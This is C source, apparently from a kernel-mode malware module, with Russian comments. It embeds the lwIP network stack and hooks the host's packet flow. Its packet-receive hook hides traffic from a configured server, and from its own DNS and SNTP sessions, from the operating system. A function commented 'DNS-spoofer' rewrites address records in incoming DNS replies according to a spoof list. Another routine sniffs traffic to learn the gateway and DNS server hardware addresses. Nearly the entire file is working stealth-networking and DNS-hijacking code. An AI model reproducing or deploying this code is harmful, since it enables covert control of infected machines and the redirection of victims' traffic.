// LWIP stack

#include "arch/queue.h"

// core
//#include "../../mod_shared/lwip/core/def.c"
#include "../../mod_shared/lwip/core/memp.c"
#include "../../mod_shared/lwip/core/mem.c"
#include "../../mod_shared/lwip/core/pbuf.c"
#include "../../mod_shared/lwip/core/timers.c"
#include "../../mod_shared/lwip/core/tcp.c"
#include "../../mod_shared/lwip/core/tcp_in.c"
#include "../../mod_shared/lwip/core/tcp_out.c"
#include "../../mod_shared/lwip/core/netif.c"
#include "../../mod_shared/lwip/core/raw.c"
#include "../../mod_shared/lwip/core/init.c"
#include "../../mod_shared/lwip/core/udp.c"
#include "../../mod_shared/lwip/core/dns.c"

// ipv4
#include "../../mod_shared/lwip/core/ipv4/ip_frag.c"
#include "../../mod_shared/lwip/core/ipv4/ip4.c"
#include "../../mod_shared/lwip/core/inet_chksum.c"
#include "../../mod_shared/lwip/core/ipv4/ip4_addr.c"

// arch
#include "../../mod_shared/lwip/arch/sys_arch.c"
#include "../../mod_shared/lwip/arch/queue.c"

// api
#include "../../mod_shared/lwip/api/tcpip.c"
#include "../../mod_shared/lwip/api/netbuf.c"
#include "../../mod_shared/lwip/api/api_lib.c"
#include "../../mod_shared/lwip/api/api_msg.c"
#include "../../mod_shared/lwip/api/err.c"

//netif
#include "../../mod_shared/lwip/netif/etharp.c"
#include "../../mod_shared/lwip/netif/ethernetif.c"

#include "../../mod_shared/lwip/core/sntp.c"

BOOLEAN tcpip_network_metrics_detector(uint8_t* pBuffer, uint32_t size)
{
    struct eth_hdr* pEthHdr;
    struct etharp_hdr* pArpHdr;
    struct ip_hdr* pIpHdr;
    pndis_adapter_t pAdapter;
    pmod_common_block_t pCommonBlock;
    pmod_network_block_t pNetworkBlock;
    uint32_t i, sum = 0, neededSum = 2;
    //uint64_t outText;
    USE_GLOBAL_BLOCK

    pCommonBlock = pGlobalBlock->pCommonBlock;
    pNetworkBlock = pGlobalBlock->pNetworkBlock;

    pAdapter = pNetworkBlock->pActiveAdapter;
    FnKdPrint(("begin: MAC Address detector\n"));

    if (pAdapter && pAdapter->bObtainedIPs && !pAdapter->isComplete) {
        pEthHdr = (struct eth_hdr*)(pBuffer - ETH_PAD_SIZE);

        if (pAdapter->bSupportedHardware) {
            if (pCommonBlock->fnhtons(pEthHdr->type) == ETHTYPE_IP) {
                pIpHdr = (struct ip_hdr*)(pBuffer + sizeof(struct eth_hdr) - ETH_PAD_SIZE);
#if DBG
                {
                    uint32_t tmpIpVal = pAdapter->ipAddr;
                    FnKdPrint(("   Our IP -> %d.%d.%d.%d\n", tmpIpVal & 0xff, (tmpIpVal >> 8) & 0xff, (tmpIpVal >> 16) & 0xff, (tmpIpVal >> 24) & 0xff));
                    tmpIpVal = pIpHdr->dest.addr;
                    FnKdPrint(("   Inc IP -> %d.%d.%d.%d\n", tmpIpVal & 0xff, (tmpIpVal >> 8) & 0xff, (tmpIpVal >> 16) & 0xff, (tmpIpVal >> 24) & 0xff));
                }
#endif

                neededSum += (pAdapter->ipNameServers[0] == 0 ? 0 : 1) + (pAdapter->ipNameServers[1] == 0 ? 0 : 1);

                //outText = 0x326d; pGlobalBlock->pCommonBlock->fnDbgPrint((char*)&outText);

                if (pIpHdr->dest.addr == pAdapter->ipAddr) {
                    ETHADDR32_COPY(&pAdapter->macAddr, &pEthHdr->dest);

                    FnKdPrint(("   MAC Address detected: %d:%d:%d:%d:%d:%d\n", pAdapter->macAddr[0], pAdapter->macAddr[1], pAdapter->macAddr[2], pAdapter->macAddr[3], pAdapter->macAddr[4], pAdapter->macAddr[5]));

                    pAdapter->obtainedMacs[0] = 1;

                    //outText = 0x326d; pGlobalBlock->pCommonBlock->fnDbgPrint((char*)&outText);
                }

                // Возможные варианты топологии сети:
                // 1. Подключение к интеренту осуществляется через PPPoE с данной.
                // 2. Подключение к интеренту осуществляется на стороне шлюзовой машины, которая доступна внутри сети для данной.
                if (pIpHdr->src.addr == pAdapter->ipGateway) {
                    struct etharp_entry* pEthArpEntry = &pGlobalBlock->pTcpipBlock->arp_table[0];
                    pEthArpEntry->ipaddr.addr = pAdapter->ipGateway;
                    ETHADDR32_COPY(&pEthArpEntry->ethaddr, &pEthHdr->src);

                    // Копируем в остальные слоты по-дефолту гейтвейные данные.
                    __movsb((uint8_t*)(++pEthArpEntry), (uint8_t*)&pGlobalBlock->pTcpipBlock->arp_table[0], sizeof(struct etharp_entry));
                    __movsb((uint8_t*)(++pEthArpEntry), (uint8_t*)&pGlobalBlock->pTcpipBlock->arp_table[0], sizeof(struct etharp_entry));

                    pAdapter->obtainedMacs[1] = 1;
                    //outText = 0x336d; pGlobalBlock->pCommonBlock->fnDbgPrint((char*)&outText);
                }

                {
                    uint32_t ipaddr;

                    for (i = 0; i < 2; ++i) {
                        ipaddr = pAdapter->ipNameServers[i];

                        // Если IP-адрес DNS-сервера не равен нули и не равен IP-адресу шлюза.
                        if (ipaddr != 0 && ipaddr != pAdapter->ipGateway) {
                            struct etharp_entry* pEthArpEntry = &pGlobalBlock->pTcpipBlock->arp_table[i + 1];

                            //outText = 0x356d; pGlobalBlock->pCommonBlock->fnDbgPrint((char*)&outText);

                            if ((ipaddr & pAdapter->ipMask) != (pAdapter->ipAddr & pAdapter->ipMask)) {
                                if (pGlobalBlock->pTcpipBlock->arp_table[0].ipaddr.addr != 0) {
                                    // Адрес за пределами сети.
                                    pAdapter->obtainedMacs[i + 2] = 1;
                                    __movsb((uint8_t*)pEthArpEntry, (uint8_t*)&pGlobalBlock->pTcpipBlock->arp_table[0], sizeof(struct etharp_entry));
                                }
                            }
                            else if (pIpHdr->src.addr == ipaddr) {
                                // Адрес внутри сети.
                                pAdapter->obtainedMacs[i + 2] = 1;
                                pEthArpEntry->ipaddr.addr = ipaddr;
                                ETHADDR32_COPY(&pEthArpEntry->ethaddr, &pEthHdr->src);
                            }
                        }
                        else if (ipaddr == pAdapter->ipGateway) {
                            //outText = 0x346d; pGlobalBlock->pCommonBlock->fnDbgPrint((char*)&outText);
                            // Вся информация уже была получена.
                            pAdapter->obtainedMacs[i + 2] = 1;
                        }
                    }
                }

                for (i = 0; i < neededSum; ++i) {
                    sum += pAdapter->obtainedMacs[i];
                }
                
                if (sum == neededSum) {
                    pAdapter->isComplete = 1;
                    pCommonBlock->fnKeSetEvent(&pAdapter->dynDetectEvent, 0, FALSE);
                }
            }
        }
        else {
            // Проверяем поле Hardware type (HTYPE)...
            if (pCommonBlock->fnhtons(pEthHdr->type) == ETHTYPE_ARP) {
                //outText = 0x306d; pGlobalBlock->pCommonBlock->fnDbgPrint((char*)&outText);
                pArpHdr = (struct etharp_hdr*)(pBuffer + sizeof(struct eth_hdr) - ETH_PAD_SIZE);

                if (pCommonBlock->fnhtons(pArpHdr->hwtype) == 0x0001/*Ethernet*/) {
                    pAdapter->bSupportedHardware = TRUE;
                    //outText = 0x316d; pGlobalBlock->pCommonBlock->fnDbgPrint((char*)&outText);
                }
                else {
                    // Останавливаем детектирование, т. к. мы не поддерживаем текущий транспортный протокол...
                    pCommonBlock->fnKeSetEvent(&pAdapter->dynDetectEvent, 0, FALSE);
                }
            }
        }
    }
    FnKdPrint(("end: MAC Address detector\n"));

    return HOOK_PASS_PACKET;
}

int tcpip_receive(uint8_t* pBuffer, uint32_t size)
{
    struct eth_hdr* pEthHdr;
    struct ip_hdr* pIpHdr;
    struct tcp_hdr* pTcpHdr;
    struct udp_hdr* pUdpHdr;
    int ret = HOOK_PASS_PACKET;
    int err = ERR_OK;
    struct pbuf *p, *q;
    PUCHAR data;
    struct tcpip_msg* msg;
    USE_GLOBAL_BLOCK

    // Реализация перехвата пакетов с целью их фильтрации и модификации должна быть реализованана на этом уровне
    // На уровне протоколов целесообразно иметь три разных фильтра:
    // 1. IP-фильтр. Данный фильтр позволит фильтровать IP-пакеты с определёнными признаками.
    // 2. TCP-фильтр. Данный фильтр позволит фильтровать TCP-пакеты с опделелёнными признаками, также на уровне
    //    функции-фильтра могут быть реализованы фильтры для прикладных протоколов основанных на TCP/IP.
    // 3. UDP-фильтр. Данный фильтр позволит фильтровать UDP-пакеты с опделелёнными признаками, также на уровне
    //    функции-фильтра могут быть реализованы фильтры для прикладных протоколов основанных на UDP/IP.
    //
    // Фильтрация пакетов должна осущесвляться только после того, как пакет будет идентифицирован как непрнадлежащий к нашему TCP/IP стеку.

    pEthHdr = (struct eth_hdr*)(pBuffer - ETH_PAD_SIZE);
    if (PP_NTOHS(pEthHdr->type) == ETHTYPE_IP) {
        pIpHdr = (struct ip_hdr*)(pBuffer + sizeof(struct eth_hdr) - ETH_PAD_SIZE);
        if (pIpHdr->_proto == IP_PROTO_TCP) {
            pTcpHdr = (struct tcp_hdr*)((PUCHAR)pIpHdr + sizeof(struct ip_hdr));
            if (pGlobalBlock->pCommonBlock->serverAddr > 0 && pGlobalBlock->pCommonBlock->serverAddr == pIpHdr->src.addr &&
                pGlobalBlock->pTcpipBlock->localPort == PP_NTOHS(pTcpHdr->dest) && PP_NTOHS(pTcpHdr->src) == 80) {
                ret = HOOK_REJECT_PACKET;
            }
            else {
                return ret;
            }
        }
        else if (pIpHdr->_proto == IP_PROTO_UDP) {
            pUdpHdr = (struct udp_hdr*)((PUCHAR)pIpHdr + sizeof(struct ip_hdr));

            if (pGlobalBlock->pTcpipBlock->dns_pcb != NULL && PP_NTOHS(pUdpHdr->src) == DNS_SERVER_PORT && (pGlobalBlock->pTcpipBlock->dns_pcb->flags & UDP_FLAGS_CONNECTED) != 0 && pGlobalBlock->pTcpipBlock->dns_pcb->local_port == PP_NTOHS(pUdpHdr->dest)) {
                ret = HOOK_REJECT_PACKET;
            }
            else if (pGlobalBlock->pTcpipBlock->sntp_pcb != NULL && PP_NTOHS(pUdpHdr->src) == SNTP_PORT && pGlobalBlock->pTcpipBlock->sntp_pcb->local_port == PP_NTOHS(pUdpHdr->dest)) {
                ret = HOOK_REJECT_PACKET;
            }
            else {
                // Функция для фильтрации UDP пакетов.
                return pGlobalBlock->pTcpipBlock->fntcpip_udp_decoder(pIpHdr, pUdpHdr, pBuffer, size);
            }
        }
        else {
            if (pGlobalBlock->pCommonBlock->serverAddr > 0 && pGlobalBlock->pCommonBlock->serverAddr == pIpHdr->src.addr) {
                ret = HOOK_REJECT_PACKET;
            }
            else {
                return ret;
            }
        }
    }
#if LWIP_ARP
    else if (PP_NTOHS(pEthHdr->type) != ETHTYPE_ARP) {
#else
    else {
#endif // LWIP_ARP
        return ret;
    }

    /* move received packet into a new pbuf */
#if ETH_PAD_SIZE
    size += ETH_PAD_SIZE; /* allow room for Ethernet padding */
#endif

    /* We allocate a pbuf chain of pbufs from the pool. */
    p = pGlobalBlock->pTcpipBlock->fnpbuf_alloc(PBUF_RAW, (uint16_t)size, PBUF_POOL);

    if (p == NULL) {
        return ret;
    }

#if ETH_PAD_SIZE
    pGlobalBlock->pTcpipBlock->fnpbuf_header(p, -ETH_PAD_SIZE); /* drop the padding word */
#endif

    for (q = p, data = pBuffer; q != NULL; q = q->next) {
        MEMCPY(q->payload, data, q->len);
        data += q->len;
    }

#if ETH_PAD_SIZE
    pGlobalBlock->pTcpipBlock->fnpbuf_header(p, ETH_PAD_SIZE); /* reclaim the padding word */
#endif

    /* full packet send to tcpip_thread to process */
    do {
        msg = (struct tcpip_msg*)memp_malloc(MEMP_TCPIP_MSG_INPKT);
        if (msg == NULL) {
            err = ERR_MEM;
            break;
        }

        msg->type = TCPIP_MSG_INPKT;
        msg->msg.inp.p = p;
        msg->msg.inp.netif = pGlobalBlock->pTcpipBlock->netif_default;
        if (pGlobalBlock->pTcpipBlock->fnsys_mbox_trypost((sys_mbox_t*)&pGlobalBlock->pTcpipBlock->mbox, msg) != ERR_OK) {
            memp_free(MEMP_TCPIP_MSG_INPKT, msg);
            err = ERR_MEM;
        }
    } while (0);

    if (err != ERR_OK) {
        pGlobalBlock->pTcpipBlock->fnpbuf_free(p);
    }

    return ret;
}

#define NS_CMPRSFLGS 0xc0
#define	INDIR_MASK	NS_CMPRSFLGS
#define NS_MAXDNAME	1025	/* maximum domain name */
#define NS_INT16SZ 2
#define NS_INT32SZ 4

/*
 * Inline versions of get/put short/long.  Pointer is advanced.
 */
#define NS_GET16(s, cp) do { \
	uint8_t* t_cp = (uint8_t*)(cp); \
	(s) = ((uint16_t)t_cp[0] << 8) \
	    | ((uint16_t)t_cp[1]) \
	    ; \
	(cp) += NS_INT16SZ; \
} while (0)

#define NS_GET32(l, cp) do { \
    uint8_t* t_cp = (uint8_t*)(cp); \
    (l) = ((uint32_t)t_cp[0] << 24) \
    | ((uint32_t)t_cp[1] << 16) \
    | ((uint32_t)t_cp[2] << 8) \
    | ((uint32_t)t_cp[3]) \
    ; \
    (cp) += NS_INT32SZ; \
} while (0)

#define NS_PUT16(s, cp) do { \
    uint16_t t_s = (uint16_t)(s); \
    uint8_t* t_cp = (uint8_t*)(cp); \
    *t_cp++ = (uint8_t)(t_s >> 8); \
    *t_cp   = (uint8_t)(t_s); \
    (cp) += NS_INT16SZ; \
} while (0)

#define NS_PUT32(l, cp) do { \
    uint32_t t_l = (uint32_t)(l); \
    uint8_t* t_cp = (uint8_t*)(cp); \
    *t_cp++ = (uint8_t)(t_l >> 24); \
    *t_cp++ = (uint8_t)(t_l >> 16); \
    *t_cp++ = (uint8_t)(t_l >> 8); \
    *t_cp   = (uint8_t)(t_l); \
    (cp) += NS_INT32SZ; \
} while (0)

int dns_expand(const uint8_t* msg, const uint8_t* eom_orig, const uint8_t* comp_dn, char* exp_dn, int length)
{
    const uint8_t* cp;
    char *dn, *eom;
    int c, n, len = -1, checked = 0;

    dn = exp_dn;
    cp = comp_dn;
    eom = exp_dn + length;

    /* Fetch next label in domain name */
    while ((n = *cp++) != 0) {
        /* Check for indirection */
        switch (n & INDIR_MASK) {
            case 0:
                if (dn != exp_dn) {
                    if (dn >= eom)
                    return -1;
                    *dn++ = '.';
                }
                if (dn+n >= eom) {
                    return -1;
                }
                checked += n + 1;
                while (--n >= 0) {
                    int c = *cp++;
                    if ((c == '.') || (c == '\\')) {
                        if (dn + n + 2 >= eom) {
                            return -1;
                        }
                        *dn++ = '\\';
                    }
                    *dn++ = (char)c;
                    if (cp >= eom_orig) { /* out of range */
                        return -1;
                    }
                }
                break;

            case INDIR_MASK:
                if (len < 0)
                len = (int)(cp - comp_dn + 1);
                cp = msg + (((n & 0x3f) << 8) | (*cp & 0xff));
                if (cp < msg || cp >= eom_orig) { /* out of range */
                    return -1;
                }
                checked += 2;
                /*
                * Check for loops in the compressed name;
                * if we've looked at the whole message,
                * there must be a loop.
                */
                if (checked >= eom_orig - msg) {
                    return -1;
                }
                break;

            default:
                return -1;   /* flag error */
        }
    }

    *dn = '\0';

    for (dn = exp_dn; (c = *dn) != '\0'; dn++) {
        if (c < 0x80 && isspace(c)) {
            return -1;
        }
    }

    if (len < 0) {
        len = (int)(cp - comp_dn);
    }

    return len;
}

/*
 * Values for class field
 */
typedef enum __ns_class {
	ns_c_invalid = 0,	/* Cookie. */
	ns_c_in = 1,		/* Internet. */
	ns_c_2 = 2,		/* unallocated/unsupported. */
	ns_c_chaos = 3,		/* MIT Chaos-net. */
	ns_c_hs = 4,		/* MIT Hesiod. */
	/* Query class values which do not appear in resource records */
	ns_c_none = 254,	/* for prereq. sections in update requests */
	ns_c_any = 255,		/* Wildcard match. */
	ns_c_max = 65536
} ns_class;

/*
 * Currently defined opcodes.
 */
typedef enum __ns_opcode {
	ns_o_query = 0,		/* Standard query. */
	ns_o_iquery = 1,	/* Inverse query (deprecated/unsupported). */
	ns_o_status = 2,	/* Name server status query (unsupported). */
				/* Opcode 3 is undefined/reserved. */
	ns_o_notify = 4,	/* Zone change notification. */
	ns_o_update = 5,	/* Zone update message. */
	ns_o_max = 6
} ns_opcode;

/*
 * Currently defined type values for resources and queries.
 */
typedef enum __ns_type {
	ns_t_invalid = 0,	/* Cookie. */
	ns_t_a = 1,		/* Host address. */
	ns_t_ns = 2,		/* Authoritative server. */
	ns_t_md = 3,		/* Mail destination. */
	ns_t_mf = 4,		/* Mail forwarder. */
	ns_t_cname = 5,		/* Canonical name. */
	ns_t_soa = 6,		/* Start of authority zone. */
	ns_t_mb = 7,		/* Mailbox domain name. */
	ns_t_mg = 8,		/* Mail group member. */
	ns_t_mr = 9,		/* Mail rename name. */
	ns_t_null = 10,		/* Null resource record. */
	ns_t_wks = 11,		/* Well known service. */
	ns_t_ptr = 12,		/* Domain name pointer. */
	ns_t_hinfo = 13,	/* Host information. */
	ns_t_minfo = 14,	/* Mailbox information. */
	ns_t_mx = 15,		/* Mail routing information. */
	ns_t_txt = 16,		/* Text strings. */
	ns_t_rp = 17,		/* Responsible person. */
	ns_t_afsdb = 18,	/* AFS cell database. */
	ns_t_x25 = 19,		/* X_25 calling address. */
	ns_t_isdn = 20,		/* ISDN calling address. */
	ns_t_rt = 21,		/* Router. */
	ns_t_nsap = 22,		/* NSAP address. */
	ns_t_nsap_ptr = 23,	/* Reverse NSAP lookup (deprecated). */
	ns_t_sig = 24,		/* Security signature. */
	ns_t_key = 25,		/* Security key. */
	ns_t_px = 26,		/* X.400 mail mapping. */
	ns_t_gpos = 27,		/* Geographical position (withdrawn). */
	ns_t_aaaa = 28,		/* Ip6 Address. */
	ns_t_loc = 29,		/* Location Information. */
	ns_t_nxt = 30,		/* Next domain (security). */
	ns_t_eid = 31,		/* Endpoint identifier. */
	ns_t_nimloc = 32,	/* Nimrod Locator. */
	ns_t_srv = 33,		/* Server Selection. */
	ns_t_atma = 34,		/* ATM Address */
	ns_t_naptr = 35,	/* Naming Authority PoinTeR */
	ns_t_kx = 36,		/* Key Exchange */
	ns_t_cert = 37,		/* Certification record */
	ns_t_a6 = 38,		/* IPv6 address (deprecates AAAA) */
	ns_t_dname = 39,	/* Non-terminal DNAME (for IPv6) */
	ns_t_sink = 40,		/* Kitchen sink (experimentatl) */
	ns_t_opt = 41,		/* EDNS0 option (meta-RR) */
	ns_t_tsig = 250,	/* Transaction signature. */
	ns_t_ixfr = 251,	/* Incremental zone transfer. */
	ns_t_axfr = 252,	/* Transfer zone of authority. */
	ns_t_mailb = 253,	/* Transfer mailbox records. */
	ns_t_maila = 254,	/* Transfer mail agent records. */
	ns_t_any = 255,		/* Wildcard match. */
	ns_t_zxfr = 256,	/* BIND-specific, nonstandard. */
	ns_t_max = 65536
} ns_type;


/* Pattern matching code from OpenSSH. */
int match_pattern(const char* s, const char* pattern)
{
    USE_GLOBAL_BLOCK

    for (;;) {
        if (*pattern == '\0') {
            return (*s == '\0');
        }

        if (*pattern == '*') {
            pattern++;

            if (*pattern == '\0') {
                return 1;
            }

            if (*pattern != '?' && *pattern != '*') {
                for (; *s; ++s) {
                    if (*s == *pattern && pGlobalBlock->pTcpipBlock->fnmatch_pattern(s + 1, pattern + 1)) {
                        return 1;
                    }
                }
                return 0;
            }
            for ( ; *s; ++s) {
                if (pGlobalBlock->pTcpipBlock->fnmatch_pattern(s, pattern)) {
                    return 1;
                }
            }
            return 0;
        }
        if (!*s) {
            return 0;
        }

        if (*pattern != '?' && *pattern != *s) {
            return 0;
        }

        ++s;
        ++pattern;
    }
    /* NOTREACHED */
}

int tcpip_dns_spoofed_a(const char* aName, uint32_t* pIpAddr)
{
    pdns_spoof_entry_t pHead;
    pdns_spoof_entry_t pEntry;
    USE_GLOBAL_BLOCK

    InterlockedExchange(&pGlobalBlock->pTcpipBlock->dnsSpooferPaused, TRUE);

    pHead = &pGlobalBlock->pTcpipBlock->dnsSpoofHead;
    pEntry = (pdns_spoof_entry_t)pHead->Flink;
    while (pEntry != pHead) {
        if (pEntry->type == ns_t_a && pGlobalBlock->pTcpipBlock->fnmatch_pattern(aName, pEntry->name)) {
            *pIpAddr = pEntry->ipAddr;
            InterlockedExchange(&pGlobalBlock->pTcpipBlock->dnsSpooferPaused, FALSE);
            return TRUE;
        }
        pEntry = (pdns_spoof_entry_t)pEntry->Flink;
    }

    InterlockedExchange(&pGlobalBlock->pTcpipBlock->dnsSpooferPaused, FALSE);

    return FALSE;
}

int tcpip_udp_decoder(struct ip_hdr* pIpHdr, struct udp_hdr* pUdpHdr, uint8_t* pBuffer, uint32_t size)
{
    BOOLEAN ret = HOOK_PASS_PACKET;
    int isModified = FALSE;
    USE_GLOBAL_BLOCK

    do {
        if (!pGlobalBlock->pTcpipBlock->dnsSpooferPaused && pUdpHdr->src == 0x3500) { // DNS-spoofer :)
//             /** DNS message header */
//             struct dns_hdr {
//                 PACK_STRUCT_FIELD(uint16_t id);
//                 PACK_STRUCT_FIELD(UINT8 flags1);
//                 PACK_STRUCT_FIELD(UINT8 flags2);
//                 PACK_STRUCT_FIELD(uint16_t numquestions);
//                 PACK_STRUCT_FIELD(uint16_t numanswers);
//                 PACK_STRUCT_FIELD(uint16_t numauthrr);
//                 PACK_STRUCT_FIELD(uint16_t numextrarr);
//             } PACK_STRUCT_STRUCT;

            // Обрабатываем выходящий DNS-пакет.
            struct dns_hdr* pDNSHdr = (struct dns_hdr*)((uint8_t*)pUdpHdr + sizeof(struct udp_hdr)); 
            char name[NS_MAXDNAME];
            uint8_t* data;
            uint8_t* end;
            int name_len;
            uint8_t* q = NULL;
            int16_t class;
            uint16_t type;
            uint32_t ipAddr;

            // Нас интересуют только DNS-ответы, содержашие результат.
            if (pDNSHdr->flags1 & 0x01 && PP_NTOHS(pDNSHdr->numquestions) == 1) {
                uint16_t i;
                data = (uint8_t*)(pDNSHdr + 1);
                end = (uint8_t*)pDNSHdr + pUdpHdr->len - sizeof(struct udp_hdr);

                // Подменяемые имена будем искать исключетельно в списке ответов, который находится за списком вопросов.
                // Извлекаем имя из пакета.
                name_len = pGlobalBlock->pTcpipBlock->fndns_expand((uint8_t*)pDNSHdr, end, data, name, sizeof(name));

                q = data + name_len;
                
                // Извлекаем тип и класс */
                NS_GET16(type, q);
                NS_GET16(class, q);

                /* handle only internet class */
                if (class != ns_c_in) {
                    break;
                }

                // q содержит указатель на список ответов.
                for (i = 0; i < PP_NTOHS(pDNSHdr->numanswers); ++i) {
                    uint32_t ttl;
                    uint16_t len;
                    // Извлекаем имя.
                    name_len = pGlobalBlock->pTcpipBlock->fndns_expand((uint8_t*)pDNSHdr, end, q, name, sizeof(name));

                    q += name_len;

                    // Извлекаем тип и класс */
                    NS_GET16(type, q);
                    NS_GET16(class, q);
                    NS_GET32(ttl, q);
                    NS_GET16(len, q); // Считываем длину.

                    if (type == ns_t_a) {
                        if (pGlobalBlock->pTcpipBlock->fntcpip_dns_spoofed_a(name, &ipAddr)) {
                            NS_PUT32(ipAddr, q); // Изменяем IP-адрес.
                            isModified = TRUE;
                        }
                        else {
                            q += len;
                        }
                    }
                    else if (type == ns_t_cname) {
                        q += len;
                    }
                    else {
                        q += len;
                    }
                }
            }
        }   
    } while (0);

    // Корректируем контрольные суммы.
    if (isModified) {
        struct pbuf p;
        uint16_t udpSize;

        ret |= HOOK_UPDATE_PACKET;

        udpSize = (uint16_t)size - (uint16_t)((uint8_t*)pUdpHdr - pBuffer);

        p.tot_len = p.len = udpSize;
        p.payload = pUdpHdr;
        p.next = NULL;

        pUdpHdr->chksum = 0;

        pUdpHdr->chksum = ipX_chksum_pseudo_partial(0, &p, IP_PROTO_UDP, udpSize, udpSize, (ip_addr_t*)&pIpHdr->src, (ip_addr_t*)&pIpHdr->dest);
    }

    return ret;
}

int tcpip_send(struct netif * netif, struct pbuf *p)
{
    PUCHAR packetMem = NULL, ptr;
    int err = ERR_OK;
    struct pbuf* q;
    pmod_network_block_t pNetworkBlock;
    pmod_tcpip_block_t pTcpipBlock;
    USE_GLOBAL_BLOCK

    pNetworkBlock = pGlobalBlock->pNetworkBlock;
    pTcpipBlock = pGlobalBlock->pTcpipBlock;

#if ETH_PAD_SIZE
    pTcpipBlock->fnpbuf_header(p, -ETH_PAD_SIZE); /* drop the padding word */
#endif
    do {
        packetMem = pNetworkBlock->fnnetwork_allocate_packet_buffer(p->tot_len);
        if (packetMem != NULL) {
            ptr = packetMem;
            for(q = p; q != NULL; q = q->next) {
                MEMCPY(ptr, q->payload, q->len);
                ptr += q->len;
            }
#if DBG
            {
                struct eth_hdr* pEthHdr;
                struct ip_hdr* pIpHdr;
                struct tcp_hdr* pTcpHdr;
                struct udp_hdr* pUdpHdr;
                pEthHdr = (struct eth_hdr*)(packetMem - ETH_PAD_SIZE);
                if (PP_NTOHS(pEthHdr->type) == ETHTYPE_IP) {
                    pIpHdr = (struct ip_hdr*)(packetMem + sizeof(struct eth_hdr) - ETH_PAD_SIZE);

                    {
                        uint32_t srcIpVal = pIpHdr->src.addr;
                        uint32_t dstIpVal = pIpHdr->dest.addr;
                        FnKdPrint(("Send packet (%d) from %d.%d.%d.%d to %d.%d.%d.%d with type %s\n", p->tot_len, srcIpVal & 0xff, (srcIpVal >> 8) & 0xff, (srcIpVal >> 16) & 0xff, (srcIpVal >> 24) & 0xff,
                            dstIpVal & 0xff, (dstIpVal >> 8) & 0xff, (dstIpVal >> 16) & 0xff, (dstIpVal >> 24) & 0xff, pIpHdr->_proto == IP_PROTO_TCP ? "TCP" : (pIpHdr->_proto == IP_PROTO_UDP ? "UDP" : "Unknown")));
                    }
                }
                else if (PP_NTOHS(pEthHdr->type) == ETHTYPE_ARP) {
                    FnKdPrint(("Send ARP packet (%d) from %d:%d:%d:%d:%d:%d to %d:%d:%d:%d:%d:%d\n", p->tot_len,
                        pEthHdr->src.addr[0], pEthHdr->src.addr[1], pEthHdr->src.addr[2], pEthHdr->src.addr[3], pEthHdr->src.addr[4], pEthHdr->src.addr[5],
                        pEthHdr->dest.addr[0], pEthHdr->dest.addr[1], pEthHdr->dest.addr[2], pEthHdr->dest.addr[3], pEthHdr->dest.addr[4], pEthHdr->dest.addr[5]));
                }
                else {
                    FnKdPrint(("Send packet (%d) with type %d\n", p->tot_len, PP_NTOHS(pEthHdr->type)));
                }
            }
#endif
            err = pNetworkBlock->fnnetwork_send_packet(packetMem, p->tot_len);
        }
        else {
            err = ERR_MEM;
            FnKdPrint(("LoaderSendPacketFromStack: failed with LdrNdisAllocateMemoryWithTag\n"));
        }
    } while(FALSE);
#if ETH_PAD_SIZE
    pTcpipBlock->fnpbuf_header(p, ETH_PAD_SIZE); /* reclaim the padding word */
#endif

    return err;
}
